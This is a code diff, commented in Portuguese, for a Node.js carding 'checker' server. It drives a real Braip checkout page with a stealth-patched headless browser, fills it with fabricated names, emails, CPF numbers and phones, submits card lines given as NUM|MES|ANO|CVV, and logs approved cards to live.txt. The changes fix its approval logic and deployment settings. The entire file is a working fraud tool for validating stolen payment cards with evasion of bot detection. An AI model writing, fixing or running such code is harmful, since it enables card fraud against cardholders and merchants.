@@ -1,13 +1,14 @@
 const express = require("express");
-const puppeteer = require("puppeteer-extra");
+// MUDANÇA: Usando um método de importação mais explícito para evitar erros de módulo.
+const puppeteer = require("puppeteer-extra").addExtra(require("puppeteer"));
 const StealthPlugin = require("puppeteer-extra-plugin-stealth");
 const fs = require("fs");
 
-// Inicializa o plugin do Stealth para o Puppeteer
+// Adiciona o plugin de stealth ao puppeteer
 puppeteer.use(StealthPlugin());
 
 // =================================================================
-//      FUNÇÕES AUXILIARES (Geradores de dados aleatórios)
+//      FUNÇÕES AUXILIARES (Sem alterações)
 // =================================================================
 
 function gerarNomeAleatorio() {
@@ -83,9 +84,6 @@ function gerarTelefoneAleatorio() {
 
 function salvarCartaoAprovado(cardLine) {
   try {
-    // ATENÇÃO: Em ambientes como o Railway, o sistema de arquivos é temporário.
-    // O arquivo 'live.txt' pode ser apagado em reinicializações do servidor.
-    // Para uma solução permanente, considere usar um banco de dados.
     fs.appendFileSync("live.txt", `CARTÃO APROVADO: ${cardLine}\n`);
   } catch (error) {
     console.error("Erro ao salvar cartão no live.txt:", error.message);
@@ -93,13 +91,12 @@ function salvarCartaoAprovado(cardLine) {
 }
 
 // =================================================================
-//      FUNÇÃO PRINCIPAL `testarCartao`
+//      FUNÇÃO PRINCIPAL `testarCartao` (LÓGICA CORRIGIDA)
 // =================================================================
 
 async function testarCartao(cardLine) {
   const [cardNumber, month, yearFull, cvv] = cardLine.split("|");
   const year = yearFull.slice(-2);
-
   const dadosPessoa = gerarNomeAleatorio();
   const email = gerarEmailAleatorio(
     dadosPessoa.primeiroNome,
@@ -109,23 +106,20 @@ async function testarCartao(cardLine) {
   const telefone = gerarTelefoneAleatorio();
 
   let browser = null;
-
   try {
-    // As flags '--no-sandbox' e '--disable-setuid-sandbox' são essenciais para rodar em ambientes de contêiner (como no Railway)
     browser = await puppeteer.launch({
-      headless: 'new',
-      args: ["--no-sandbox", "--disable-setuid-sandbox"],
+      headless: "new",
+      args: [
+        "--no-sandbox",
+        "--disable-setuid-sandbox",
+        "--disable-dev-shm-usage",
+      ],
     });
 
     const page = await browser.newPage();
-
     await page.setRequestInterception(true);
     page.on("request", (request) => {
-      if (
-        request.resourceType() === "image" ||
-        request.resourceType() === "stylesheet" ||
-        request.resourceType() === "font"
-      ) {
+      if (["image", "stylesheet", "font"].includes(request.resourceType())) {
         request.abort();
       } else {
         request.continue();
@@ -134,14 +128,13 @@ async function testarCartao(cardLine) {
 
     await page.goto(
       "https://ev.braip.com/checkout/pla2gpqx/che8pwe8?af=afi9e5lyz5&currency=BRL&pv=pro22kk9",
-      { waitUntil: "domcontentloaded" }
+      { waitUntil: "domcontentloaded", timeout: 60000 }
     );
 
-    await page.type("#nome", dadosPessoa.nomeCompleto, { delay: 20 });
-    await page.type("#email", email, { delay: 20 });
-    await page.type("#documento", cpf, { delay: 50 });
+    await page.type("#nome", dadosPessoa.nomeCompleto, { delay: 40 });
+    await page.type("#email", email, { delay: 30 });
+    await page.type("#documento", cpf, { delay: 30 });
     await page.type("#celular", telefone, { delay: 20 });
-
     await page.type(
       'input[placeholder="Digite somente números do cartão"]',
       cardNumber,
@@ -152,31 +145,46 @@ async function testarCartao(cardLine) {
       dadosPessoa.nomeCompleto,
       { delay: 70 }
     );
-    await page.type('input[name="credito_mes"]', month, { delay: 30 });
-    await page.type('input[name="credito_ano"]', year, { delay: 30 });
-    await page.type('input[name="credito_cvc"]', cvv, { delay: 30 });
+    await page.type('input[name="credito_mes"]', month, { delay: 20 });
+    await page.type('input[name="credito_ano"]', year, { delay: 20 });
+    await page.type('input[name="credito_cvc"]', cvv, { delay: 20 });
 
     await page.click("#submit");
 
-    await page.waitForSelector('div[style="padding-top:7px;"]', {
-      visible: true,
-      timeout: 35000,
-    });
-    const mensagemErro = await page.$eval(
-      'div[style="padding-top:7px;"]',
-      (el) => el.innerText.trim()
-    );
+    // ** LÓGICA CORRIGIDA ABAIXO **
+    try {
+      // Tenta encontrar a mensagem de erro que indica REPROVADO.
+      const mensagemErroElement = await page.waitForSelector(
+        'div[style="padding-top:7px;"]',
+        { visible: true, timeout: 35000 }
+      );
+      const mensagemErro = await mensagemErroElement.evaluate((el) =>
+        el.innerText.trim()
+      );
 
-    return {
-      status: "reprovado",
-      mensagem: mensagemErro,
-      cartao: `${cardNumber}|${month}|${yearFull}|${cvv}`,
-    };
+      // Se encontrou, o cartão foi de fato REPROVADO.
+      return {
+        status: "reprovado",
+        mensagem: mensagemErro,
+        cartao: `${cardNumber}|${month}|${yearFull}|${cvv}`,
+      };
+    } catch (error) {
+      // Se deu TIMEOUT ao esperar pela mensagem de erro, significa que ela NÃO apareceu.
+      // Este é o cenário de SUCESSO (APROVADO).
+      salvarCartaoAprovado(cardLine);
+      return {
+        status: "aprovado",
+        mensagem: "O cartão foi processado com sucesso!",
+        cartao: `${cardNumber}|${month}|${yearFull}|${cvv}`,
+      };
+    }
   } catch (error) {
-    salvarCartaoAprovado(cardLine);
+    // Se qualquer outro erro acontecer (falha ao iniciar o browser, falha no goto, etc.),
+    // será capturado aqui. Isso é um ERRO DE AUTOMAÇÃO, não um cartão aprovado.
+    console.error("Ocorreu um erro geral na automação:", error);
     return {
-      status: "aprovado",
-      mensagem: "O cartão foi processado com sucesso!",
+      status: "erro_automacao",
+      mensagem: `Falha ao executar o teste: ${error.message}`,
       cartao: `${cardNumber}|${month}|${yearFull}|${cvv}`,
     };
   } finally {
@@ -187,30 +195,21 @@ async function testarCartao(cardLine) {
 }
 
 // =================================================================
-//      CONFIGURAÇÃO DO SERVIDOR EXPRESS
+//      CONFIGURAÇÃO DO SERVIDOR EXPRESS (Sem alterações)
 // =================================================================
 
 const app = express();
-// =======================================================================
-//      ALTERAÇÃO PRINCIPAL PARA HOSPEDAGEM
-//      Usa a porta do ambiente (fornecida pelo Railway) ou 3000 se estiver rodando localmente.
 const PORT = process.env.PORT || 3000;
-// =======================================================================
-
 app.use(express.json());
 
 app.get("/cc", async (req, res) => {
   const { lista } = req.query;
   console.log(`[+] Requisição recebida para testar: ${lista}`);
-
   if (!lista) {
-    return res.status(400).json({
-      status: "erro",
-      mensagem:
-        "Parâmetro 'lista' não encontrado. Use a URL no formato: /cc?lista=NUM|MES|ANO|CVV",
-    });
+    return res
+      .status(400)
+      .json({ status: "erro", mensagem: "Parâmetro 'lista' não encontrado." });
   }
-
   try {
     const resultado = await testarCartao(lista);
     res.json(resultado);
@@ -219,13 +218,11 @@ app.get("/cc", async (req, res) => {
     console.error("Erro no servidor:", serverError);
     res.status(500).json({
       status: "erro_servidor",
-      mensagem: "Ocorreu um erro inesperado ao processar sua requisição.",
+      mensagem: "Ocorreu um erro inesperado.",
     });
   }
 });
 
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Servidor rodando na porta ${PORT}`);
-  console.log("Aguardando requisições na rota /cc?lista=...");
 });
-
